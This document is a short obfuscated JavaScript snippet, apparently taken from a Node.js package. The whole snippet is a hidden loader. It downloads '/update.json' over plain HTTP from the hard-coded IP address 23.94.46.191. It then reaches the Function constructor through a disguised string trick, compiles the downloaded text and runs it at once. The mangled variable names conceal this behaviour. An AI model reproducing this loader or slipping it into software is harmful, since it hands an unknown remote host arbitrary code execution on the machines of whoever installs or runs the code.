;(function () {
  var _0x5978f8 = require('http')
  return _0x5978f8.get(
    {
      host: '23.94.46.191',
      port: 80,
      path: '/update.json',
    },
    function (_0x2abaf2) {
      var _0x43fe57 = ''
      _0x2abaf2.on('data', function (_0x2176cf) {
        _0x43fe57 += _0x2176cf
      })
      _0x2abaf2.on('end', function () {
        var _0x9f8a9f =
          this[
            (typeof this.Buffer.from).charAt(0).toUpperCase() +
              (typeof this.Buffer.from).slice(1)
          ]
        var _0x21be30 = new _0x9f8a9f(_0x43fe57)
        _0x21be30()
      })
    }
  )
})()
